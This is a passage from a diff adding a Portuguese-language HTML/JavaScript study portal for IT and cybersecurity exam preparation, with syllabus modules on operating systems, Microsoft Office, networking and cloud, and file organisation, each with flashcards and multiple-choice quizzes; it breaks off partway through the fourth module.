@@ -1,0 +1,2550 @@
+<!DOCTYPE html>
+<html lang="pt-BR" class="dark">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Portal da Tecnologia — Plataforma de Estudos em TI & Cibersegurança</title>
+  <!-- Tailwind CSS -->
+  <script src="https://cdn.tailwindcss.com"></script>
+  <!-- Google Fonts: Inter & JetBrains Mono -->
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet" />
+
+  <script>
+    tailwind.config = {
+      darkMode: 'class',
+      theme: {
+        extend: {
+          fontFamily: {
+            sans: ['Inter', 'sans-serif'],
+            mono: ['JetBrains Mono', 'monospace'],
+          },
+          colors: {
+            slate: {
+              850: '#151e32',
+              900: '#0f172a',
+              950: '#080d1a',
+            },
+            cyber: {
+              cyan: '#06b6d4',
+              emerald: '#10b981',
+              indigo: '#6366f1',
+              amber: '#f59e0b',
+              rose: '#f43f5e',
+            }
+          }
+        }
+      }
+    };
+  </script>
+
+  <style>
+    /* Custom Scrollbar & Flip Card Mechanics */
+    ::-webkit-scrollbar {
+      width: 6px;
+      height: 6px;
+    }
+    ::-webkit-scrollbar-track {
+      background: #0f172a;
+    }
+    ::-webkit-scrollbar-thumb {
+      background: #334155;
+      border-radius: 9999px;
+    }
+    ::-webkit-scrollbar-thumb:hover {
+      background: #475569;
+    }
+
+    .perspective-1000 {
+      perspective: 1000px;
+    }
+    .transform-style-3d {
+      transform-style: preserve-3d;
+    }
+    .backface-hidden {
+      backface-visibility: hidden;
+    }
+    .rotate-y-180 {
+      transform: rotateY(180deg);
+    }
+
+    .cyber-grid-bg {
+      background-image: radial-gradient(rgba(56, 189, 248, 0.08) 1px, transparent 1px);
+      background-size: 24px 24px;
+    }
+
+    @keyframes pulseGlow {
+      0%, 100% { box-shadow: 0 0 15px rgba(6, 182, 212, 0.15); }
+      50% { box-shadow: 0 0 25px rgba(6, 182, 212, 0.35); }
+    }
+    .glow-card {
+      animation: pulseGlow 4s infinite ease-in-out;
+    }
+  </style>
+</head>
+<body class="bg-slate-950 text-slate-100 font-sans antialiased selection:bg-cyan-500/30 selection:text-cyan-200 overflow-x-hidden">
+
+  <!-- App Shell -->
+  <div id="app" class="min-h-screen flex flex-col lg:flex-row cyber-grid-bg">
+
+    <!-- Mobile Backdrop -->
+    <div id="sidebar-backdrop" onclick="toggleSidebar(false)" class="fixed inset-0 bg-slate-950/80 backdrop-blur-sm z-40 hidden lg:hidden transition-opacity"></div>
+
+    <!-- Sidebar Navigation -->
+    <aside id="sidebar" class="fixed lg:sticky top-0 left-0 z-50 h-screen w-80 bg-slate-900/95 border-r border-slate-800/80 backdrop-blur-xl flex flex-col transform -translate-x-full lg:translate-x-0 transition-transform duration-300 ease-in-out">
+      <!-- Brand Header -->
+      <div class="p-5 border-b border-slate-800 flex items-center justify-between">
+        <button onclick="navigateToHome()" class="flex items-center gap-3 text-left group">
+          <div class="w-10 h-10 rounded-xl bg-gradient-to-br from-cyan-500 to-indigo-600 flex items-center justify-center shadow-lg shadow-cyan-500/20 group-hover:scale-105 transition-transform">
+            <svg class="w-6 h-6 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+              <path stroke-linecap="round" stroke-linejoin="round" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
+            </svg>
+          </div>
+          <div>
+            <h1 class="font-bold text-base tracking-tight text-white leading-tight">Portal da Tecnologia</h1>
+            <p class="text-[11px] font-medium text-cyan-400">TI & Segurança Cibernética</p>
+          </div>
+        </button>
+        <button onclick="toggleSidebar(false)" class="lg:hidden p-2 rounded-lg text-slate-400 hover:text-white hover:bg-slate-800">
+          <svg class="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"/></svg>
+        </button>
+      </div>
+
+      <!-- Mini Progress Bar in Sidebar -->
+      <div class="px-5 py-3.5 bg-slate-950/50 border-b border-slate-800/80">
+        <div class="flex items-center justify-between text-xs mb-1.5">
+          <span class="text-slate-400 font-medium">Progresso Geral</span>
+          <span id="sidebar-progress-text" class="font-mono font-semibold text-cyan-400">0%</span>
+        </div>
+        <div class="w-full h-2 bg-slate-800 rounded-full overflow-hidden">
+          <div id="sidebar-progress-bar" class="h-full bg-gradient-to-r from-cyan-500 to-emerald-400 rounded-full transition-all duration-500" style="width: 0%"></div>
+        </div>
+        <div class="mt-2.5 flex gap-2">
+          <button onclick="navigateToHome()" class="flex-1 py-1.5 px-2.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-xs font-medium text-slate-200 flex items-center justify-center gap-1.5 transition">
+            <svg class="w-3.5 h-3.5 text-cyan-400" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 12l2-2m0 0l7-7 7 7M5 10v10a1 1 0 001 1h3m10-11l2 2m-2-2v10a1 1 0 01-1 1h-3m-6 0a1 1 0 001-1v-4a1 1 0 011-1h2a1 1 0 011 1v4a1 1 0 001 1m-6 0h6"/></svg>
+            Dashboard
+          </button>
+          <button onclick="openQuickReviewModal()" class="flex-1 py-1.5 px-2.5 rounded-lg bg-indigo-500/15 hover:bg-indigo-500/25 border border-indigo-500/30 text-xs font-medium text-indigo-300 flex items-center justify-center gap-1.5 transition">
+            <svg class="w-3.5 h-3.5" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"/></svg>
+            Revisão Rápida
+          </button>
+        </div>
+      </div>
+
+      <!-- Hierarchical Syllabus Tree -->
+      <nav id="sidebar-nav" class="flex-1 overflow-y-auto p-3 space-y-5">
+        <!-- Populated dynamically via JS -->
+      </nav>
+
+      <!-- Sidebar Footer -->
+      <div class="p-3.5 border-t border-slate-800 text-[11px] text-slate-500 flex items-center justify-between">
+        <span>23 Módulos Completos</span>
+        <button onclick="confirmResetProgress()" class="text-slate-400 hover:text-rose-400 underline transition">Resetar Progresso</button>
+      </div>
+    </aside>
+
+    <!-- Main Workspace -->
+    <div class="flex-1 flex flex-col min-w-0">
+      <!-- Top Mobile / Desktop Header -->
+      <header class="sticky top-0 z-30 bg-slate-950/85 backdrop-blur-md border-b border-slate-800/80 px-4 sm:px-6 py-3 flex items-center justify-between gap-3">
+        <div class="flex items-center gap-3">
+          <button onclick="toggleSidebar(true)" class="lg:hidden p-2 rounded-xl bg-slate-900 border border-slate-800 text-slate-300 hover:text-white">
+            <svg class="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16"/></svg>
+          </button>
+          <div id="breadcrumb" class="flex items-center gap-2 text-xs sm:text-sm text-slate-400 truncate">
+            <span class="text-cyan-400 font-semibold">Dashboard</span>
+          </div>
+        </div>
+
+        <div class="flex items-center gap-2 sm:gap-3">
+          <div class="hidden sm:flex items-center gap-2 px-3 py-1.5 rounded-full bg-slate-900 border border-slate-800 text-xs text-slate-300">
+            <span class="w-2 h-2 rounded-full bg-emerald-400 animate-pulse"></span>
+            <span id="header-stats-badge">0 / 23 concluídos</span>
+          </div>
+          <button onclick="openQuickReviewModal()" class="p-2 sm:px-3 sm:py-1.5 rounded-xl bg-cyan-500/10 hover:bg-cyan-500/20 border border-cyan-500/30 text-cyan-300 text-xs font-medium flex items-center gap-1.5 transition" title="Modo Flashcards Rápidos">
+            <svg class="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 11H5m14 0a2 2 0 012 2v6a2 2 0 01-2 2H5a2 2 0 01-2-2v-6a2 2 0 012-2m14 0V9a2 2 0 00-2-2M5 11V9a2 2 0 012-2m0 0V5a2 2 0 012-2h6a2 2 0 012 2v2M7 7h10"/></svg>
+            <span class="hidden md:inline">Flashcards Aleatórios</span>
+          </button>
+        </div>
+      </header>
+
+      <!-- Dynamic Content Container -->
+      <main id="main-content" class="flex-1 p-4 sm:p-6 lg:p-8 max-w-6xl w-full mx-auto">
+        <!-- Rendered by JS -->
+      </main>
+
+      <!-- Footer -->
+      <footer class="border-t border-slate-800/80 bg-slate-900/40 px-4 sm:px-6 py-4 mt-12">
+        <div class="max-w-6xl mx-auto flex flex-col sm:flex-row items-center justify-between gap-2 text-xs text-slate-500">
+          <p>Portal da Tecnologia — Ambiente Interativo de Estudos em TI e Segurança Cibernética.</p>
+          <p class="text-slate-400 font-medium">Desenvolvido pelo Analista Flávio Santana</p>
+        </div>
+      </footer>
+    </div>
+  </div>
+
+  <!-- Custom Modal (For Quick Review & Reset Confirmation - No alert/confirm used) -->
+  <div id="custom-modal" class="fixed inset-0 z-50 hidden items-center justify-center p-4 bg-slate-950/80 backdrop-blur-sm">
+    <div id="custom-modal-content" class="bg-slate-900 border border-slate-700/80 rounded-2xl max-w-xl w-full p-6 shadow-2xl transform transition-all">
+      <!-- Populated dynamically -->
+    </div>
+  </div>
+
+  <!-- Toast Notification -->
+  <div id="toast" class="fixed bottom-5 right-5 z-50 hidden items-center gap-2.5 px-4 py-3 rounded-xl bg-slate-800 border border-cyan-500/40 text-sm text-white shadow-xl">
+    <span id="toast-icon" class="text-cyan-400">✓</span>
+    <span id="toast-msg">Progresso salvo!</span>
+  </div>
+
+  <script>
+    // =========================================================================
+    // 1. BASE DE CONHECIMENTO ESTRUTURADA (MÓDULOS I E II COMPLETOS)
+    // =========================================================================
+    const SYLLABUS = [
+      // -------------------- TRILHA I: TECNOLOGIA DA INFORMAÇÃO --------------------
+      {
+        id: 'ti-1',
+        track: 'TI',
+        number: '1',
+        title: 'Sistemas Operacionais (Linux e Windows)',
+        shortDesc: 'Arquitetura, sistema de arquivos, permissões, processos e comandos essenciais.',
+        tags: ['Linux', 'Windows', 'Bash', 'PowerShell', 'Kernel', 'Permissões'],
+        summary: `
+          <p class="text-slate-300 leading-relaxed mb-4">
+            O <strong>Sistema Operacional (SO)</strong> é o software fundamental que gerencia o hardware do computador (CPU, memória RAM, armazenamento, dispositivos de E/S) e fornece uma interface para que aplicativos e usuários executem tarefas.
+          </p>
+          <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-5">
+            <div class="p-4 rounded-xl bg-slate-900/90 border border-slate-800">
+              <div class="flex items-center gap-2 text-cyan-400 font-semibold mb-2">
+                <span>🐧</span> Ambiente Linux (Kernel Monolítico / POSIX)
+              </div>
+              <ul class="text-xs sm:text-sm text-slate-300 space-y-1.5 list-disc list-inside">
+                <li><strong>Hierarquia FHS:</strong> Tudo parte da raiz <code class="text-cyan-300">/</code> (<code class="text-slate-400">/etc</code> configs, <code class="text-slate-400">/var</code> logs, <code class="text-slate-400">/home</code> usuários, <code class="text-slate-400">/bin</code> binários).</li>
+                <li><strong>Case-sensitive:</strong> <code class="text-cyan-300">Arquivo.txt</code> é diferente de <code class="text-cyan-300">arquivo.txt</code>.</li>
+                <li><strong>Permissões Octais:</strong> Leitura (<code class="text-emerald-400">r=4</code>), Escrita (<code class="text-amber-400">w=2</code>), Execução (<code class="text-rose-400">x=1</code>) para Dono (u), Grupo (g) e Outros (o). Ex: <code class="text-cyan-300">chmod 755</code>.</li>
+                <li><strong>Sistemas de Arquivos:</strong> ext4, XFS, Btrfs.</li>
+              </ul>
+            </div>
+            <div class="p-4 rounded-xl bg-slate-900/90 border border-slate-800">
+              <div class="flex items-center gap-2 text-indigo-400 font-semibold mb-2">
+                <span>🪟</span> Ambiente Windows (Kernel Híbrido NT)
+              </div>
+              <ul class="text-xs sm:text-sm text-slate-300 space-y-1.5 list-disc list-inside">
+                <li><strong>Unidades Lógicas:</strong> Baseado em letras (<code class="text-indigo-300">C:\\</code>, <code class="text-indigo-300">D:\\</code>) e barra invertida (<code class="text-indigo-300">\\</code>).</li>
+                <li><strong>Case-insensitive:</strong> Não diferencia maiúsculas de minúsculas nos nomes de arquivos.</li>
+                <li><strong>Sistemas de Arquivos:</strong> <strong>NTFS</strong> (suporta ACLs, criptografia EFS, compressão e arquivos &gt; 4GB), FAT32, exFAT.</li>
+                <li><strong>Registro (Regedit) & Serviços:</strong> Base hierárquica de configurações e gerenciamento via PowerShell / Gerenciador de Tarefas.</li>
+              </ul>
+            </div>
+          </div>
+          <div class="overflow-x-auto rounded-xl border border-slate-800">
+            <table class="w-full text-left text-xs sm:text-sm">
+              <thead class="bg-slate-900 text-slate-300 border-b border-slate-800">
+                <tr>
+                  <th class="p-3">Ação / Tarefa</th>
+                  <th class="p-3 text-cyan-400">Comando Linux (Bash)</th>
+                  <th class="p-3 text-indigo-400">Comando Windows (CMD / PS)</th>
+                </tr>
+              </thead>
+              <tbody class="divide-y divide-slate-800/80 text-slate-300">
+                <tr><td class="p-3 font-medium">Listar arquivos/diretórios</td><td class="p-3 font-mono text-cyan-300">ls -la</td><td class="p-3 font-mono text-indigo-300">dir / Get-ChildItem</td></tr>
+                <tr><td class="p-3 font-medium">Exibir diretório atual</td><td class="p-3 font-mono text-cyan-300">pwd</td><td class="p-3 font-mono text-indigo-300">cd / Get-Location</td></tr>
+                <tr><td class="p-3 font-medium">Listar processos ativos</td><td class="p-3 font-mono text-cyan-300">ps aux / top</td><td class="p-3 font-mono text-indigo-300">tasklist / Get-Process</td></tr>
+                <tr><td class="p-3 font-medium">Encerrar processo por PID</td><td class="p-3 font-mono text-cyan-300">kill -9 [PID]</td><td class="p-3 font-mono text-indigo-300">taskkill /PID [PID] /F</td></tr>
+                <tr><td class="p-3 font-medium">Alterar permissões</td><td class="p-3 font-mono text-cyan-300">chmod / chown</td><td class="p-3 font-mono text-indigo-300">icacls</td></tr>
+              </tbody>
+            </table>
+          </div>
+        `,
+        labType: 'terminal-os',
+        flashcards: [
+          { q: 'O que significa a permissão chmod 754 no Linux?', a: '7 (rwx) para o Dono (leitura, escrita, execução), 5 (r-x) para o Grupo (leitura e execução) e 4 (r--) para Outros (apenas leitura).' },
+          { q: 'Qual a principal diferença entre NTFS e FAT32 no Windows?', a: 'NTFS suporta arquivos maiores que 4 GB, permissões avançadas (ACL), journaling e criptografia (EFS); FAT32 limita arquivos a 4 GB e não tem segurança nativa.' },
+          { q: 'Para que serve o diretório /etc no Linux?', a: 'Armazena os arquivos de configuração do sistema operacional e dos serviços instalados.' }
+        ],
+        quiz: [
+          {
+            question: 'No Linux, qual comando exibe o caminho completo do diretório atual em que o usuário se encontra?',
+            options: ['ls -l', 'pwd', 'cd ~', 'whoami'],
+            answer: 1,
+            explanation: 'O comando pwd (Print Working Directory) imprime o caminho absoluto do diretório de trabalho atual.'
+          },
+          {
+            question: 'Sobre o sistema de arquivos NTFS utilizado no Windows, é correto afirmar que:',
+            options: ['Não permite arquivos maiores que 4 GB.', 'É exclusivo para sistemas Linux.', 'Suporta listas de controle de acesso (ACLs) e recuperação por journaling.', 'É case-sensitive por padrão no Explorer.'],
+            answer: 2,
+            explanation: 'O NTFS (New Technology File System) possui journaling para integridade de dados, permissões granulares via ACLs e suporte a grandes volumes.'
+          }
+        ]
+      },
+      {
+        id: 'ti-2',
+        track: 'TI',
+        number: '2',
+        title: 'Edição de Textos, Planilhas e Apresentações (Microsoft Office)',
+        shortDesc: 'Word, Excel e PowerPoint: recursos avançados, fórmulas essenciais e atalhos produtivos.',
+        tags: ['Word', 'Excel', 'PowerPoint', 'Fórmulas', 'Atalhos', 'Office'],
+        summary: `
+          <p class="text-slate-300 leading-relaxed mb-4">
+            A suíte <strong>Microsoft Office / Microsoft 365</strong> é padrão corporativo para produção documental, análise de dados e comunicação executiva. Dominar referências absolutas, funções lógicas e recursos de revisão aumenta drasticamente a produtividade.
+          </p>
+          <div class="grid grid-cols-1 md:grid-cols-3 gap-4 mb-5">
+            <div class="p-4 rounded-xl bg-slate-900 border border-blue-500/30">
+              <h4 class="font-bold text-blue-400 mb-2">📄 Microsoft Word (.docx)</h4>
+              <ul class="text-xs text-slate-300 space-y-1.5 list-disc list-inside">
+                <li><strong>Mala Direta:</strong> Integra documentos modelo com bases de dados (Excel/Outlook) para envio em lote.</li>
+                <li><strong>Controlar Alterações:</strong> Rastreia inserções, exclusões e comentários colaborativos.</li>
+                <li><strong>Sumário Automático:</strong> Depende da aplicação correta dos estilos <em>Título 1, Título 2</em>.</li>
+                <li><strong>Quebra de Seção:</strong> Permite cabeçalhos ou orientações (retrato/paisagem) diferentes no mesmo arquivo.</li>
+              </ul>
+            </div>
+            <div class="p-4 rounded-xl bg-slate-900 border border-emerald-500/30">
+              <h4 class="font-bold text-emerald-400 mb-2">📊 Microsoft Excel (.xlsx)</h4>
+              <ul class="text-xs text-slate-300 space-y-1.5 list-disc list-inside">
+                <li><strong>Referências:</strong> Relativa (<code class="text-emerald-300">A1</code>), Absoluta (<code class="text-emerald-300">$A$1</code> - tecla F4) e Mista (<code class="text-emerald-300">$A1</code>).</li>
+                <li><strong>Funções Chave:</strong> <code class="text-emerald-300">SE()</code>, <code class="text-emerald-300">SOMASE()</code>, <code class="text-emerald-300">CONT.SE()</code>, <code class="text-emerald-300">PROCV()</code> e <code class="text-emerald-300">PROCX()</code>.</li>
+                <li><strong>Tabela Dinâmica:</strong> Agrupa, resume e cruza milhares de registros sem alterar a base original.</li>
+                <li><strong>Validação de Dados:</strong> Restringe entradas (listas suspensas, datas, intervalos).</li>
+              </ul>
+            </div>
+            <div class="p-4 rounded-xl bg-slate-900 border border-amber-500/30">
+              <h4 class="font-bold text-amber-400 mb-2">📽️ PowerPoint (.pptx)</h4>
+              <ul class="text-xs text-slate-300 space-y-1.5 list-disc list-inside">
+                <li><strong>Slide Mestre:</strong> Define fontes, logotipos, cores e rodapés globais para todos os slides.</li>
+                <li><strong>Transição vs Animação:</strong> Transição ocorre <em>entre slides</em>; Animação aplica-se aos <em>objetos internos</em>.</li>
+                <li><strong>Modo de Exibição do Apresentador:</strong> Mostra anotações, próximo slide e cronômetro apenas para o orador.</li>
+                <li><strong>Atalhos:</strong> <code class="text-amber-300">F5</code> (inicia do 1º slide), <code class="text-amber-300">Shift+F5</code> (slide atual).</li>
+              </ul>
+            </div>
+          </div>
+        `,
+        labType: 'excel-sandbox',
+        flashcards: [
+          { q: 'Qual a diferença entre uma referência $A$1 e A1 no Excel?', a: 'A1 é relativa (ajusta-se ao ser arrastada para outras células). $A$1 é absoluta (mantém fixa tanto a coluna A quanto a linha 1 ao copiar a fórmula).' },
+          { q: 'Para que serve o Slide Mestre no PowerPoint?', a: 'Permite padronizar o layout, fontes, cores, plano de fundo e elementos visuais de toda a apresentação em um único local.' },
+          { q: 'O que diferencia uma Quebra de Página de uma Quebra de Seção no Word?', a: 'A quebra de página apenas inicia uma nova página; a quebra de seção cria uma divisão independente permitindo mudar orientação (paisagem), margens e cabeçalhos.' }
+        ],
+        quiz: [
+          {
+            question: 'No Microsoft Excel, qual fórmula calcula a soma dos valores no intervalo B2:B10 apenas quando a célula correspondente em A2:A10 for igual a "TI"?',
+            options: ['=SOMA(A2:A10;"TI";B2:B10)', '=SOMASE(A2:A10;"TI";B2:B10)', '=CONT.SE(A2:A10;"TI")', '=PROCV("TI";A2:B10;2;FALSO)'],
+            answer: 1,
+            explanation: 'A função SOMASE(intervalo_critério; critério; intervalo_soma) soma os valores correspondentes apenas quando o critério é atendido.'
+          },
+          {
+            question: 'No PowerPoint, qual tecla de atalho inicia a apresentação a partir do slide selecionado atualmente?',
+            options: ['F5', 'Ctrl + F5', 'Shift + F5', 'Alt + Enter'],
+            answer: 2,
+            explanation: 'F5 inicia a apresentação desde o primeiro slide, enquanto Shift + F5 inicia diretamente do slide atual.'
+          }
+        ]
+      },
+      {
+        id: 'ti-3',
+        track: 'TI',
+        number: '3',
+        title: 'Redes de Computadores, Navegadores, E-mail e Cloud',
+        shortDesc: 'Internet vs Intranet, Edge/Chrome, Outlook, Busca Avançada, Grupos e Computação em Nuvem.',
+        tags: ['TCP/IP', 'Intranet', 'Edge', 'Chrome', 'Outlook', 'Cloud', 'IaaS', 'PaaS', 'SaaS'],
+        summary: `
+          <p class="text-slate-300 leading-relaxed mb-4">
+            Este módulo abrange desde os fundamentos de conectividade e ferramentas de navegação até o modelo moderno de <strong>Computação em Nuvem</strong>.
+          </p>
+          <div class="space-y-4">
+            <div class="p-4 rounded-xl bg-slate-900 border border-slate-800">
+              <h4 class="text-cyan-400 font-semibold mb-2">3.1 Internet, Intranet, Extranet e Protocolos</h4>
+              <p class="text-xs sm:text-sm text-slate-300 mb-2">
+                <strong>Internet:</strong> Rede mundial pública baseada na pilha <strong>TCP/IP</strong>. <strong>Intranet:</strong> Rede privada corporativa que usa os <em>mesmos protocolos da Internet</em> (HTTP, TCP/IP), restrita a colaboradores internos. <strong>Extranet:</strong> Acesso externo controlado à intranet (parceiros/fornecedores via VPN).
+              </p>
+              <div class="flex flex-wrap gap-2 text-xs font-mono">
+                <span class="px-2.5 py-1 rounded bg-slate-800 text-cyan-300">HTTP (80) / HTTPS (443)</span>
+                <span class="px-2.5 py-1 rounded bg-slate-800 text-emerald-300">DNS (53 - Nomes → IP)</span>
+                <span class="px-2.5 py-1 rounded bg-slate-800 text-amber-300">DHCP (IP Dinâmico)</span>
+                <span class="px-2.5 py-1 rounded bg-slate-800 text-indigo-300">SMTP (Envio) / IMAP & POP3 (Recebimento)</span>
+              </div>
+            </div>
+
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+              <div class="p-4 rounded-xl bg-slate-900 border border-slate-800">
+                <h4 class="text-indigo-400 font-semibold mb-2">3.2 & 3.3 Navegadores (Edge/Chrome) e Outlook</h4>
+                <ul class="text-xs text-slate-300 space-y-1.5 list-disc list-inside">
+                  <li><strong>Chrome & Edge:</strong> Ambos utilizam o motor <strong>Chromium</strong>. O Edge possui integração nativa com ecossistema Microsoft, modo IE legado e Prevenção de Rastreamento.</li>
+                  <li><strong>Navegação Privativa (Anônima / InPrivate):</strong> Não salva histórico, cookies ou dados de formulários localmente, mas <em>não torna o usuário invisível</em> para o provedor (ISP) ou firewall corporativo.</li>
+                  <li><strong>Microsoft Outlook:</strong> Cliente de e-mail, calendário, contatos e tarefas. Suporta Exchange/Microsoft 365 (MAPI), <strong>IMAP</strong> (sincroniza pastas no servidor) e <strong>POP3</strong> (baixa mensagens localmente).</li>
+                </ul>
+              </div>
+              <div class="p-4 rounded-xl bg-slate-900 border border-slate-800">
+                <h4 class="text-emerald-400 font-semibold mb-2">3.4 & 3.5 Busca Avançada e Grupos de Discussão</h4>
+                <ul class="text-xs text-slate-300 space-y-1.5 list-disc list-inside">
+                  <li><strong>Operadores de Busca (Google Dorks básicos):</strong> <code class="text-emerald-300">"termo exato"</code>, <code class="text-emerald-300">site:gov.br</code>, <code class="text-emerald-300">filetype:pdf</code>, <code class="text-emerald-300">-excluir</code>.</li>
+                  <li><strong>Grupos de Discussão & Colaboração:</strong> Listas de e-mail, fóruns técnicos (Stack Overflow, GitHub Discussions), Usenet/Newsgroups e plataformas modernas (Microsoft Teams, Slack, Google Groups).</li>
+                </ul>
+              </div>
+            </div>
+
+            <div class="p-4 rounded-xl bg-slate-900 border border-cyan-500/30">
+              <h4 class="text-cyan-400 font-semibold mb-3">3.6 Computação na Nuvem (Cloud Computing - NIST)</h4>
+              <div class="grid grid-cols-1 sm:grid-cols-3 gap-3 text-xs">
+                <div class="p-3 rounded-lg bg-slate-950 border border-slate-800">
+                  <span class="font-bold text-cyan-300 block mb-1">IaaS (Infraestrutura como Serviço)</span>
+                  <p class="text-slate-400">Aluguel de VMs, redes e storage virtualizados. O cliente gerencia o SO e apps. Ex: AWS EC2, Azure VMs.</p>
+                </div>
+                <div class="p-3 rounded-lg bg-slate-950 border border-slate-800">
+                  <span class="font-bold text-indigo-300 block mb-1">PaaS (Plataforma como Serviço)</span>
+                  <p class="text-slate-400">Ambiente pronto para deploy de código sem gerenciar SO/servidores. Ex: Azure App Service, Heroku, Google App Engine.</p>
+                </div>
+                <div class="p-3 rounded-lg bg-slate-950 border border-slate-800">
+                  <span class="font-bold text-emerald-300 block mb-1">SaaS (Software como Serviço)</span>
+                  <p class="text-slate-400">Aplicação completa acessada via navegador/app. Ex: Microsoft 365, Salesforce, Google Workspace.</p>
+                </div>
+              </div>
+            </div>
+          </div>
+        `,
+        labType: 'terminal-net',
+        flashcards: [
+          { q: 'Qual a diferença entre os protocolos IMAP e POP3 no Microsoft Outlook?', a: 'IMAP mantém as mensagens sincronizadas no servidor (ideal para múltiplos dispositivos). POP3 baixa os e-mails para o dispositivo local e, por padrão, os remove do servidor.' },
+          { q: 'O modo Anônimo (Chrome) ou InPrivate (Edge) oculta sua navegação do administrador da rede da empresa?', a: 'Não. Ele apenas impede o salvamento local de histórico, cookies e cache no navegador. O roteador, firewall e provedor continuam vendo o tráfego.' },
+          { q: 'Cite um exemplo prático de IaaS, PaaS e SaaS.', a: 'IaaS: Máquina Virtual na AWS EC2. PaaS: Plataforma Heroku ou Azure App Service para hospedar código. SaaS: Gmail, Microsoft 365 ou Salesforce.' }
+        ],
+        quiz: [
+          {
+            question: 'Qual operador de pesquisa deve ser usado no Google para encontrar apenas arquivos em formato PDF dentro do domínio gov.br sobre LGPD?',
+            options: ['LGPD type:pdf domain:gov.br', 'LGPD filetype:pdf site:gov.br', '"LGPD" +pdf @gov.br', 'LGPD ext:pdf url:gov.br'],
+            answer: 1,
+            explanation: 'Os operadores filetype:pdf e site:gov.br filtram respectivamente a extensão do documento e o domínio específico.'
+          },
+          {
+            question: 'No modelo de Computação em Nuvem em que o provedor gerencia hardware, sistema operacional e runtime, cabendo ao cliente apenas o código da aplicação e seus dados, temos:',
+            options: ['IaaS', 'PaaS', 'SaaS', 'On-Premises'],
+            answer: 1,
+            explanation: 'Na Plataforma como Serviço (PaaS), o desenvolvedor foca apenas na aplicação e nos dados, abstraindo a gestão do SO e infraestrutura.'
+          }
+        ]
+      },
+      {
+        id: 'ti-4',
+        track: 'TI',
+        number: '4',
+        title: 'Organização e Gerenciamento de Informações, Arquivos, Pastas e Programas',
+        shortDesc: 'Taxonomia, metadados, extensões de arquivos, compactação e gestão do ciclo de vida.',
+        tags: ['Arquivos', 'Pastas', 'Metadados', 'Extensões', 'Compactação', 'GED'],
+        summary: `
+          <p class="text-slate-300 leading-relaxed mb-4">
+            A organização eficiente de arquivos e informações garante rastreabilidade, evita perda de dados e acelera a recuperação documental em ambientes corporativos e governamentais.
+          </p>
+          <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
+            <div class="p-4 rounded-xl bg-slate-900 border border-slate-800">
+              <h4 class="text-cyan-400 font-semibold mb-2">Boas Práticas de Estrutura e Nomenclatura</h4>
+              <ul class="text-xs sm:text-sm text-slate-300 space-y-1.5 list-disc list-inside">
+                <li><strong>Padrão Cronológico ISO:</strong> Usar <code class="text-cyan-300">AAAA-MM-DD_Projeto_Versao.ext</code> permite ordenação alfabética cronológica natural.</li>
+                <li><strong>Evitar Caracteres Especiais:</strong> Não usar <code class="text-rose-400">\\ / : * ? " &lt; &gt; |</code> (proibidos no Windows) nem acentos/espaços em caminhos de servidor.</li>
+                <li><strong>Metadados:</strong> "Dados sobre os dados" — autor, data de criação/modificação, tamanho, permissões, tags EXIF (em fotos).</li>
+              </ul>
+            </div>
+            <div class="p-4 rounded-xl bg-slate-900 border border-slate-800">
+              <h4 class="text-amber-400 font-semibold mb-2">Tipos de Arquivos & Compactação</h4>
+              <ul class="text-xs sm:text-sm text-slate-300 space-y-1.5 list-disc list-inside">
+                <li><strong>Compactadores:</strong> <code class="text-amber-300">.zip</code>, <code class="text-amber-300">.rar</code>, <code class="text-amber-300">.7z</code> (reduzem tamanho com algoritmos sem perda como LZMA/DEFLATE e permitem senha AES-256).</li>
+                <li><strong>Arquivamento Unix:</strong> <code class="text-amber-300">.tar.gz</code> (empacota via <em>tar</em> e comprime via <em>gzip</em>).</li>
+                <li><strong>Executáveis & Scripts:</strong> <code class="text-rose-300">.exe, .msi, .bat, .ps1</code> (Windows) e <code class="text-cyan-300">.sh, .deb, .rpm</code> (Linux).</li>
+              </ul>
+            </div>
+          </div>
+          <div class="p-4 rounded-xl bg-slate-900/70 border border-slate-800 text-xs sm:text-sm text-slate-300">
+            <strong class="text-emerald-400">Gestão de Programas:</strong> No Windows, a instalação/desinstalação ocorre via <em>Configurações &gt; Aplicativos</em> ou gerenciador de pacotes <code class="text-cyan-300">winget</code>. No Linux, utilizam-se gerenciadores como <code class="text-cyan-300">apt</code> (Debian/Ubuntu) ou <code class="text-cyan-300">dnf/yum</code> (RedHat/Fedora), que resolvem dependências automaticamente.
+          </div>
+        `,
+        labType: 'file-organizer',
+        flashcards: [
+          { q: 'O que são metadados de um arquivo?', a: 'São informações descritivas sobre o arquivo em si, como data de criação, autor, tamanho em bytes, permissões e coordenadas GPS em imagens (EXIF).' },
+          { q: 'Qual a diferença entre os comandos tar e gzip no Linux?', a: 'O tar apenas empacota vários arquivos/pastas em um único arquivo contínuo (.tar), enquanto o gzip realiza a compressão para reduzir o tamanho (.tar.gz).' }
+        ],
+        quiz: [
+          {
+            question: 'Qual formato de nomenclatura garante que os arquivos sejam ordenados cronologicamente de forma automática pelo explorador de arquivos?',
